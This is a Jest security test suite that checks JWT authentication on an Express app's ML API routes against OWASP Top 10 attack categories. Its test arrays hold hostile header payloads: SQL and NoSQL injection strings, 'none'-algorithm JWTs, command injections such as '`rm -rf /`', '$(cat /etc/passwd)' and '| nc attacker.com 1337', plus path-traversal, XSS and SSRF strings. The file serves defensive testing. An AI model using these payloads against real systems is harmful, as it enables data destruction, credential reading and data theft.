import request from 'supertest';
import express from 'express';
import { describe, it, expect, beforeEach, jest } from '@jest/globals';
import mlRoutes from '../../api/routes/mlRoutes';
import { authenticate } from '../../middleware/auth';
import { apiLimiter } from '../../middleware/rateLimiter';
import { createTestUser, createTestTokens } from '../utils/jwtTestUtils';

/**
 * ML Authentication Security Tests
 *
 * Comprehensive security testing for ML routes authentication including:
 * - OWASP Top 10 vulnerabilities
 * - JWT security best practices
 * - Input validation and sanitization
 * - Rate limiting and DoS protection
 * - Authorization boundary enforcement
 * - Security headers and response hardening
 */

// Mock dependencies for controlled testing
jest.mock('../../middleware/rateLimiter', () => ({
  apiLimiter: jest.fn((req: any, res: any, next: any) => next()),
}));

jest.mock('../../utils/logger', () => ({
  logger: {
    info: jest.fn(),
    error: jest.fn(),
    warn: jest.fn(),
    debug: jest.fn(),
  },
}));

const mockedAuthenticate = authenticate as jest.MockedFunction<
  typeof authenticate
>;
const mockedApiLimiter = apiLimiter as jest.MockedFunction<typeof apiLimiter>;

describe('ML Authentication Security Tests', () => {
  let app: express.Application;
  let validUser: any;
  let validTokens: any;

  beforeEach(async () => {
    app = express();
    app.use(express.json());
    app.use('/api/ml', mlRoutes);

    // Create valid test data
    validUser = createTestUser();
    validTokens = await createTestTokens(validUser);

    jest.clearAllMocks();

    // Default successful authentication mock
    mockedAuthenticate.mockImplementation((req: any, res: any, next: any) => {
      req.user = validUser;
      next();
      return Promise.resolve();
    } as any);

    mockedApiLimiter.mockImplementation((req: any, res: any, next: any) => next() as any);
  });

  describe('OWASP A01: Broken Access Control', () => {
    it('should prevent horizontal privilege escalation', async () => {
      // Mock authentication to set a different user
      const otherUser = createTestUser({
        id: 'other-user-id',
        email: 'other@example.com',
      });

      mockedAuthenticate.mockImplementation((req: any, res: any, next: any) => {
        req.user = otherUser;
        next();
        return Promise.resolve();
      } as any);

      // Attempt to access queue with different user credentials
      const response = await request(app)
        .get('/api/ml/queue')
        .set('Authorization', `Bearer ${validTokens.accessToken}`)
        .expect(200);

      // Should succeed but only show user's own data
      expect(response.body.success).toBe(true);
      // The queue should not contain other users' data
    });

    it('should prevent vertical privilege escalation', async () => {
      // Mock authentication to set a regular user
      const regularUser = createTestUser({
        id: 'regular-user-id',
        email: 'regular@example.com',
        profile: {
          ...createTestUser().profile!,
          consentToMLTraining: false, // Limited privileges
        },
      });

      mockedAuthenticate.mockImplementation((req: any, res: any, next: any) => {
        req.user = regularUser;
        next();
        return Promise.resolve();
      } as any);

      // Regular user should not be able to access admin-level ML operations
      const response = await request(app)
        .post('/api/ml/models/hrnetv2/warm-up')
        .set('Authorization', `Bearer ${validTokens.accessToken}`)
        .expect(200);

      // Should succeed for basic operations but not expose admin data
      expect(response.body.success).toBe(true);
    });

    it('should enforce authentication on all protected endpoints', async () => {
      const protectedEndpoints = [
        { method: 'get', path: '/api/ml/queue' },
        { method: 'post', path: '/api/ml/models/test/warm-up' },
      ];

      for (const endpoint of protectedEndpoints) {
        await request(app)[endpoint.method](endpoint.path).expect(401);
      }
    });

    it('should not leak information in error responses', async () => {
      mockedAuthenticate.mockImplementation((req: any, res: any) => {
        res.status(401).json({
          success: false,
          message: 'Chybí autentizační token',
          source: 'Auth',
        });
      } as any);

      const response = await request(app).get('/api/ml/queue').expect(401);

      // Error should not reveal system internals
      expect(response.body).not.toHaveProperty('stack');
      expect(response.body).not.toHaveProperty('code');
      expect(response.body).not.toHaveProperty('errno');
      expect(JSON.stringify(response.body)).not.toContain('prisma');
      expect(JSON.stringify(response.body)).not.toContain('database');
    });
  });

  describe('OWASP A02: Cryptographic Failures', () => {
    it('should reject tokens with weak or no signatures', async () => {
      const weakTokens = [
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJ0ZXN0In0.', // None algorithm
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ0ZXN0In0', // Missing signature
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ0ZXN0In0.weak', // Weak signature
      ];

      mockedAuthenticate.mockImplementation((req: any, res: any) => {
        res.status(401).json({
          success: false,
          message: 'Neplatný token',
          source: 'Auth',
        });
      } as any);

      for (const token of weakTokens) {
        const response = await request(app)
          .get('/api/ml/queue')
          .set('Authorization', `Bearer ${token}`)
          .expect(401);

        expect(response.body.success).toBe(false);
      }
    });

    it('should enforce secure token validation', async () => {
      // Test with tampered payload
      const tamperedPayload =
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AZXhhbXBsZS5jb20ifQ.signature';

      mockedAuthenticate.mockImplementation((req: any, res: any) => {
        res.status(401).json({
          success: false,
          message: 'Neplatný token',
          source: 'Auth',
        });
      } as any);

      const response = await request(app)
        .get('/api/ml/queue')
        .set('Authorization', `Bearer ${tamperedPayload}`)
        .expect(401);

      expect(response.body.success).toBe(false);
    });

    it('should handle algorithm confusion attacks', async () => {
      // Test with different algorithm
      const rsaToken =
        'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ0ZXN0In0.invalid';

      mockedAuthenticate.mockImplementation((req: any, res: any) => {
        res.status(401).json({
          success: false,
          message: 'Neplatný token',
          source: 'Auth',
        });
      } as any);

      const response = await request(app)
        .get('/api/ml/queue')
        .set('Authorization', `Bearer ${rsaToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
    });
  });

  describe('OWASP A03: Injection Attacks', () => {
    it('should prevent SQL injection in authorization headers', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        '"; DELETE FROM sessions; --',
        "' OR 1=1 --",
      ];

      mockedAuthenticate.mockImplementation((req: any, res: any) => {
        res.status(401).json({
          success: false,
          message: 'Neplatný token',
          source: 'Auth',
        });
      } as any);

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .get('/api/ml/queue')
          .set('Authorization', `Bearer ${payload}`)
          .expect(401);

        expect(response.body.success).toBe(false);
        // Should not execute any SQL
      }
    });

    it('should prevent NoSQL injection attempts', async () => {
      const noSqlPayloads = [
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "this.password"}',
        '{"$gt": ""}',
      ];

      mockedAuthenticate.mockImplementation((req: any, res: any) => {
        res.status(401).json({
          success: false,
          message: 'Neplatný token',
          source: 'Auth',
        });
      } as any);

      for (const payload of noSqlPayloads) {
        const response = await request(app)
          .get('/api/ml/queue')
          .set('Authorization', `Bearer ${payload}`)
          .expect(401);

        expect(response.body.success).toBe(false);
      }
    });

    it('should prevent command injection through headers', async () => {
      const commandInjectionPayloads = [
        '`rm -rf /`',
        '$(cat /etc/passwd)',
        '; cat /etc/hosts',
        '| nc attacker.com 1337',
        '&& whoami',
      ];

      mockedAuthenticate.mockImplementation((req: any, res: any) => {
        res.status(401).json({
          success: false,
          message: 'Neplatný token',
          source: 'Auth',
        });
      } as any);

      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .get('/api/ml/queue')
          .set('Authorization', `Bearer ${payload}`)
          .expect(401);

        expect(response.body.success).toBe(false);
      }
    });
  });

  describe('OWASP A04: Insecure Design', () => {
    it('should implement proper rate limiting on authentication', async () => {
      let rateLimitCalls = 0;

      mockedApiLimiter.mockImplementation((req: any, res: any, next: any) => {
        rateLimitCalls++;
        if (rateLimitCalls > 100) {
          return res.status(429).json({
            success: false,
            message: 'Too many requests',
            source: 'RateLimit',
          });
        }
        next();
      } as any);

      // Simulate rapid requests
      const promises = Array.from({ length: 10 }, () =>
        request(app).get('/api/ml/health')
      );

      await Promise.all(promises);

      expect(rateLimitCalls).toBe(10);
    });

    it('should implement proper session management', async () => {
      // Test that sessions are properly managed
      const response1 = await request(app)
        .get('/api/ml/queue')
        .set('Authorization', `Bearer ${validTokens.accessToken}`)
        .expect(200);

      const response2 = await request(app)
        .get('/api/ml/queue')
        .set('Authorization', `Bearer ${validTokens.accessToken}`)
        .expect(200);

      expect(response1.body.success).toBe(true);
      expect(response2.body.success).toBe(true);
    });

    it('should implement secure defaults', async () => {
      // Public endpoints should be minimal
      const response = await request(app).get('/api/ml/health').expect(200);

      // Should not expose sensitive information
      expect(response.body.data).not.toHaveProperty('config');
      expect(response.body.data).not.toHaveProperty('secrets');
      expect(response.body.data).not.toHaveProperty('environment');
    });
  });

  describe('OWASP A05: Security Misconfiguration', () => {
    it('should not expose stack traces in production', async () => {
      // Mock an internal error
      mockedAuthenticate.mockImplementation((req: any, res: any) => {
        res.status(500).json({
          success: false,
          message: 'Chyba autentizace',
          source: 'Auth',
        });
      } as any);

      const response = await request(app)
        .get('/api/ml/queue')
        .set('Authorization', `Bearer ${validTokens.accessToken}`)
        .expect(500);

      expect(response.body).not.toHaveProperty('stack');
      expect(response.body).not.toHaveProperty('trace');
      expect(JSON.stringify(response.body)).not.toMatch(
        /Error: .+ at .+:\d+:\d+/
      );
    });

    it('should not expose server information in headers', async () => {
      const response = await request(app).get('/api/ml/health').expect(200);

      // Should not expose server technology
      expect(response.headers).not.toHaveProperty('x-powered-by');
      expect(response.headers).not.toHaveProperty('server');
    });

    it('should handle invalid HTTP methods securely', async () => {
      // Test unsupported HTTP methods
      const response = await request(app).patch('/api/ml/health').expect(404);

      expect(response.body).not.toContain('stack');
    });
  });

  describe('OWASP A06: Vulnerable Components', () => {
    it('should handle JWT library vulnerabilities gracefully', async () => {
      // Test with potentially vulnerable JWT formats
      const vulnerableTokens = [
        'eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
        'null.null.null',
        'undefined.undefined.undefined',
      ];

      mockedAuthenticate.mockImplementation((req: any, res: any) => {
        res.status(401).json({
          success: false,
          message: 'Neplatný token',
          source: 'Auth',
        });
      } as any);

      for (const token of vulnerableTokens) {
        const response = await request(app)
          .get('/api/ml/queue')
          .set('Authorization', `Bearer ${token}`)
          .expect(401);

        expect(response.body.success).toBe(false);
      }
    });
  });

  describe('OWASP A07: Identity and Authentication Failures', () => {
    it('should prevent authentication bypass attempts', async () => {
      const bypassAttempts = [
        'Bearer admin',
        'Bearer root',
        'Bearer null',
        'Bearer undefined',
        'Bearer false',
        'Bearer 0',
      ];

      mockedAuthenticate.mockImplementation((req: any, res: any) => {
        res.status(401).json({
          success: false,
          message: 'Neplatný token',
          source: 'Auth',
        });
      } as any);

      for (const attempt of bypassAttempts) {
        const response = await request(app)
          .get('/api/ml/queue')
          .set('Authorization', attempt)
          .expect(401);

        expect(response.body.success).toBe(false);
      }
    });

    it('should prevent session fixation', async () => {
      // Test that each authentication creates a new session context
      const response1 = await request(app)
        .get('/api/ml/queue')
        .set('Authorization', `Bearer ${validTokens.accessToken}`)
        .expect(200);

      const response2 = await request(app)
        .get('/api/ml/queue')
        .set('Authorization', `Bearer ${validTokens.accessToken}`)
        .expect(200);

      // Sessions should be independent
      expect(response1.body.success).toBe(true);
      expect(response2.body.success).toBe(true);
    });

    it('should implement proper account lockout prevention', async () => {
      // Test that failed authentication attempts don't lock legitimate users
      mockedAuthenticate
        .mockImplementationOnce((req, res) => {
          res.status(401).json({
            success: false,
            message: 'Neplatný token',
            source: 'Auth',
          });
        } as any)
        .mockImplementationOnce((req: any, res, next) => {
          req.user = validUser;
          next();
        } as any);

      // Failed attempt
      await request(app)
        .get('/api/ml/queue')
        .set('Authorization', 'Bearer invalid-token')
        .expect(401);

      // Valid attempt should still work
      const response = await request(app)
        .get('/api/ml/queue')
        .set('Authorization', `Bearer ${validTokens.accessToken}`)
        .expect(200);

      expect(response.body.success).toBe(true);
    });
  });

  describe('OWASP A09: Security Logging Failures', () => {
    it('should log authentication failures without exposing sensitive data', async () => {
      mockedAuthenticate.mockImplementation((req: any, res: any) => {
        res.status(401).json({
          success: false,
          message: 'Neplatný token',
          source: 'Auth',
        });
      } as any);

      const response = await request(app)
        .get('/api/ml/queue')
        .set('Authorization', 'Bearer malicious-token')
        .expect(401);

      expect(response.body.success).toBe(false);
      // Logs should be created but not expose token content
    });

    it('should log suspicious authentication patterns', async () => {
      // Multiple failed attempts with different tokens
      const suspiciousTokens = [
        'Bearer ../../../etc/passwd',
        'Bearer <script>alert("xss")</script>',
        'Bearer ${7*7}',
        'Bearer {{7*7}}',
      ];

      mockedAuthenticate.mockImplementation((req: any, res: any) => {
        res.status(401).json({
          success: false,
          message: 'Neplatný token',
          source: 'Auth',
        });
      } as any);

      for (const token of suspiciousTokens) {
        await request(app)
          .get('/api/ml/queue')
          .set('Authorization', token)
          .expect(401);
      }

      // Should log these as suspicious patterns
    });
  });

  describe('OWASP A10: Server-Side Request Forgery (SSRF)', () => {
    it('should prevent SSRF through Authorization headers', async () => {
      const ssrfPayloads = [
        'Bearer http://localhost:22/ssh',
        'Bearer http://169.254.169.254/metadata',
        'Bearer file:///etc/passwd',
        'Bearer ftp://internal.server/file',
      ];

      mockedAuthenticate.mockImplementation((req: any, res: any) => {
        res.status(401).json({
          success: false,
          message: 'Neplatný token',
          source: 'Auth',
        });
      } as any);

      for (const payload of ssrfPayloads) {
        const response = await request(app)
          .get('/api/ml/queue')
          .set('Authorization', payload)
          .expect(401);

        expect(response.body.success).toBe(false);
      }
    });
  });

  describe('Advanced Security Scenarios', () => {
    it('should handle timing attacks on authentication', async () => {
      const startTime = Date.now();

      // Test multiple invalid tokens
      const promises = Array.from({ length: 10 }, () =>
        request(app)
          .get('/api/ml/queue')
          .set('Authorization', 'Bearer invalid-token')
      );

      await Promise.all(promises);
      const endTime = Date.now();

      // Authentication failures should not reveal timing information
      const timePerRequest = (endTime - startTime) / 10;
      expect(timePerRequest).toBeLessThan(1000); // Should be reasonably fast
    });

    it('should prevent JWT token confusion', async () => {
      // Test with refresh token used as access token
      const response = await request(app)
        .get('/api/ml/queue')
        .set('Authorization', `Bearer ${validTokens.refreshToken}`)
        .expect(401);

      expect(response.body.success).toBe(false);
    });

    it('should handle concurrent authentication attacks', async () => {
      const attackTokens = Array.from(
        { length: 100 },
        (_, i) => `invalid-token-${i}`
      );

      mockedAuthenticate.mockImplementation((req: any, res: any) => {
        res.status(401).json({
          success: false,
          message: 'Neplatný token',
          source: 'Auth',
        });
      } as any);

      const promises = attackTokens.map(token =>
        request(app)
          .get('/api/ml/queue')
          .set('Authorization', `Bearer ${token}`)
      );

      const responses = await Promise.all(promises);

      // All should fail consistently
      responses.forEach(response => {
        expect(response.status).toBe(401);
        expect(response.body.success).toBe(false);
      });
    });

    it('should prevent information disclosure through error timing', async () => {
      const times: number[] = [];

      mockedAuthenticate.mockImplementation((req: any, res: any) => {
        res.status(401).json({
          success: false,
          message: 'Neplatný token',
          source: 'Auth',
        });
      } as any);

      // Measure response times for different invalid tokens
      for (let i = 0; i < 10; i++) {
        const start = Date.now();
        await request(app)
          .get('/api/ml/queue')
          .set('Authorization', `Bearer invalid-token-${i}`)
          .expect(401);
        times.push(Date.now() - start);
      }

      // Times should be relatively consistent (no major outliers)
      const avgTime = times.reduce((a, b) => a + b, 0) / times.length;
      const maxDeviation = Math.max(...times.map(t => Math.abs(t - avgTime)));

      expect(maxDeviation).toBeLessThan(avgTime * 2); // No more than 2x deviation
    });
  });

  describe('Response Security', () => {
    it('should not expose sensitive information in responses', async () => {
      const response = await request(app).get('/api/ml/health').expect(200);

      const responseString = JSON.stringify(response.body);

      // Should not contain sensitive keywords
      const sensitiveKeywords = [
        'password',
        'secret',
        'key',
        'token',
        'credential',
        'private',
        'internal',
        'config',
        'env',
        'database',
      ];

      sensitiveKeywords.forEach(keyword => {
        expect(responseString.toLowerCase()).not.toContain(keyword);
      });
    });

    it('should sanitize error messages', async () => {
      mockedAuthenticate.mockImplementation((req: any, res: any) => {
        res.status(500).json({
          success: false,
          message: 'Chyba autentizace',
          source: 'Auth',
        });
      } as any);

      const response = await request(app)
        .get('/api/ml/queue')
        .set('Authorization', 'Bearer problematic-token')
        .expect(500);

      // Error message should be sanitized
      expect(response.body.message).not.toContain('<');
      expect(response.body.message).not.toContain('>');
      expect(response.body.message).not.toContain('script');
      expect(response.body.message).not.toContain('javascript:');
    });

    it('should implement consistent response format', async () => {
      // Test various authentication states
      const responses = [
        await request(app).get('/api/ml/health').expect(200),
        await request(app).get('/api/ml/status').expect(200),
        await request(app).get('/api/ml/models').expect(200),
      ];

      responses.forEach(response => {
        expect(response.body).toHaveProperty('success');
        expect(response.body).toHaveProperty('data');
        expect(response.body).toHaveProperty('message');
        expect(typeof response.body.success).toBe('boolean');
      });
    });
  });
});
